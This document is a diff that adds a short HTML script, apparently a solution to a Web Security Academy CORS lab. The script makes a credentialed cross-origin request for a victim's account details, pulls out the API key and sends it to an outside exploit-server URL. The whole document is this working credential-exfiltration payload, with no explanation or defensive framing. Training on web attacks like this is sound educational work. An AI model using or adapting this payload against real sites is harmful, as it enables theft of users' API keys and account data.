@@ -1,0 +1,10 @@
+<script>
+    fetch('https://0aad002f035a848c80fe03f800de00b6.web-security-academy.net/accountDetails', {
+        "credentials": "include"
+    })
+    .then((resp) => resp.json())
+    .then((data) => data.apikey)
+    .then((key) => location.assign('https://exploit-0a1000af031d844680f902e00179002c.exploit-server.net/exploit?apikey='+key))
+</script>
+
+
